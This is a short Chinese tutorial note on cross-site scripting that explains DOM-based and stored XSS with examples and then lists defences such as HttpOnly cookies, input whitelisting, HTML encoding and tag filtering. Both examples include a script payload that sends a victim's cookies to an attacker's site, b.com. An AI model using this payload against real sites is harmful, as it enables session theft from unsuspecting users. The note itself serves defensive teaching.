1.xss:
DOM Based XSS
我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，
超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，
当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到
b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，
cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。

Stored XSS
a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，
<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，
当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。

原则：　不相信客户输入的数据
注意:  攻击代码不一定在<script></script>中
    将重要的cookie标记为http only,   这样的话Javascript 中的document.cookie语句就不能获取到cookie了.
    只允许用户输入我们期望的数据。 例如：　年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。
    对数据进行Html Encode 处理
    过滤或移除特殊的Html标签， 例如: <script>, <iframe> ,  &lt; for <, &gt; for >, &quot for
    过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。

对于防止富文本类型的xss，过滤掉script等标签，还要做白名单校验。只允许使用一些确定安全的标签，
除富文本编辑器使用的标签，其他的都过滤掉。这是白名单方式，是真正合理的。
